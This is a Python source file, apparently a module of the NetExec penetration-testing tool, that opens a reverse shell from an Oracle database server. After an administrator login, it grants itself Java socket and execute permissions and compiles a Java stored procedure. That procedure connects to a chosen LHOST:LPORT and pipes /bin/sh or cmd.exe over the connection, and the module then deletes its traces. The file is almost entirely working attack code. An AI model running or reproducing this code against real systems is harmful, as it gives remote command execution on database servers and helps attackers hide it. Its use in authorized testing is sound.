from nxc.helpers.misc import CATEGORY


class NXCModule:
    """Establish a reverse shell from the Oracle server to a listener via Java stored procedures."""

    name = "oracle_shell"
    description = "Open a reverse shell from the Oracle server to LHOST:LPORT via Java stored procedures (requires DBA/SYSDBA)"
    supported_protocols = ["oracle"]
    opsec_safe = False
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.lhost = None
        self.lport = None

    def options(self, context, module_options):
        """
        LHOST   IP address your listener is on
        LPORT   Port your listener is waiting on
        """
        if "LHOST" not in module_options:
            context.log.fail("LHOST option is required — use -o LHOST=<ip>")
            return
        if "LPORT" not in module_options:
            context.log.fail("LPORT option is required — use -o LPORT=<port>")
            return
        self.lhost = module_options["LHOST"]
        try:
            self.lport = int(module_options["LPORT"])
        except ValueError:
            context.log.fail("LPORT must be an integer")

    def on_admin_login(self, context, connection):
        if not self.lhost or not self.lport:
            context.log.fail("LHOST and LPORT are required")
            return

        conn = connection.conn
        log = context.log

        if not self.java_available(conn, log):
            log.fail("Java is not enabled on this Oracle instance — cannot open reverse shell via Java stored procedures")
            return

        try:
            self.grant_java_perms(conn, log)
            self.create_java_source(conn, log)
            self.create_wrapper(conn, log)
            log.success(f"Connecting back to {self.lhost}:{self.lport} — waiting for shell to exit")
            self.run_shell(conn, log)
            log.success("Shell session closed")
        except Exception as e:
            log.fail(f"Execution error: {e}")
        finally:
            self.cleanup(conn, log)

    def java_available(self, conn, log):
        try:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT count(*) FROM dba_objects "
                "WHERE object_name = 'DBMS_JAVA' AND object_type = 'PACKAGE'"
            )
            row = cursor.fetchone()
            cursor.close()
            return row is not None and row[0] > 0
        except Exception as e:
            log.debug(f"Could not check Java availability: {e}")
            return False

    def grant_java_perms(self, conn, log):
        cursor = conn.cursor()
        cursor.execute("SELECT user FROM dual")
        current_user = cursor.fetchone()[0]
        cursor.close()

        perms = [
            (current_user, "SYS:java.lang.RuntimePermission", "writeFileDescriptor", ""),
            (current_user, "SYS:java.io.FilePermission", "<<ALL FILES>>", "execute"),
            (current_user, "SYS:java.net.SocketPermission", f"{self.lhost}:{self.lport}", "connect,resolve"),
        ]
        for grantee, perm, target, action in perms:
            try:
                cursor = conn.cursor()
                cursor.callproc("DBMS_JAVA.grant_permission", [grantee, perm, target, action])
                conn.commit()
                cursor.close()
            except Exception as e:
                log.debug(f"Java permission grant ({perm}): {e}")

    def create_java_source(self, conn, log):
        for drop in ('DROP JAVA CLASS "NxcShell"', "DROP FUNCTION nxc_shell"):
            try:
                cursor = conn.cursor()
                cursor.execute(drop)
                cursor.close()
            except Exception:
                pass

        src = (
            'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "NxcShell" AS\n'
            "import java.io.*;\n"
            "import java.net.*;\n"
            "public class NxcShell {\n"
            "    public static String connect(String host, int port) throws Exception {\n"
            "        Socket s = new Socket(host, port);\n"
            '        String os = System.getProperty("os.name").toLowerCase();\n'
            '        String[] shell = os.contains("windows")\n'
            '            ? new String[]{"cmd.exe"}\n'
            '            : new String[]{"/bin/sh", "-i"};\n'
            "        final Process p = Runtime.getRuntime().exec(shell);\n"
            "        final InputStream si = s.getInputStream();\n"
            "        final OutputStream so = s.getOutputStream();\n"
            "        Thread t1 = new Thread(() -> {\n"
            "            try {\n"
            "                byte[] buf = new byte[1024]; int n;\n"
            "                OutputStream pin = p.getOutputStream();\n"
            "                while ((n = si.read(buf)) != -1) { pin.write(buf, 0, n); pin.flush(); }\n"
            "            } catch (Exception e) {}\n"
            "        });\n"
            "        Thread t2 = new Thread(() -> {\n"
            "            try {\n"
            "                byte[] buf = new byte[1024]; int n;\n"
            "                InputStream pout = p.getInputStream();\n"
            "                while ((n = pout.read(buf)) != -1) { so.write(buf, 0, n); so.flush(); }\n"
            "            } catch (Exception e) {}\n"
            "        });\n"
            "        Thread t3 = new Thread(() -> {\n"
            "            try {\n"
            "                byte[] buf = new byte[1024]; int n;\n"
            "                InputStream perr = p.getErrorStream();\n"
            "                while ((n = perr.read(buf)) != -1) { so.write(buf, 0, n); so.flush(); }\n"
            "            } catch (Exception e) {}\n"
            "        });\n"
            "        t1.setDaemon(true); t2.setDaemon(true); t3.setDaemon(true);\n"
            "        t1.start(); t2.start(); t3.start();\n"
            "        p.waitFor();\n"
            "        s.close();\n"
            '        return "closed";\n'
            "    }\n"
            "}"
        )
        cursor = conn.cursor()
        cursor.execute(src)
        cursor.close()

        cursor = conn.cursor()
        cursor.execute(
            "SELECT status FROM user_objects WHERE object_name = 'NxcShell' AND object_type = 'JAVA CLASS'"
        )
        row = cursor.fetchone()
        cursor.close()
        if not row or row[0] != "VALID":
            cursor = conn.cursor()
            cursor.execute("SELECT text FROM user_errors WHERE name = 'NxcShell' ORDER BY sequence")
            errors = "; ".join(r[0].strip() for r in cursor.fetchall())
            cursor.close()
            raise RuntimeError(f"Java compilation failed: {errors or 'no details available'}")

    def create_wrapper(self, conn, log):
        cursor = conn.cursor()
        cursor.execute(
            "CREATE OR REPLACE FUNCTION nxc_shell(p_host IN VARCHAR2, p_port IN NUMBER) RETURN VARCHAR2 "
            "AS LANGUAGE JAVA NAME 'NxcShell.connect(java.lang.String, int) return java.lang.String';"
        )
        cursor.close()

    def run_shell(self, conn, log):
        cursor = conn.cursor()
        cursor.callfunc("nxc_shell", str, [self.lhost, self.lport])
        cursor.close()

    def cleanup(self, conn, log):
        for stmt in (
            "DROP FUNCTION nxc_shell",
            'DROP JAVA SOURCE "NxcShell"',
            'DROP JAVA CLASS "NxcShell"',
        ):
            try:
                cursor = conn.cursor()
                cursor.execute(stmt)
                conn.commit()
                cursor.close()
            except Exception as e:
                log.debug(f"Cleanup ({stmt[:25]}): {e}")
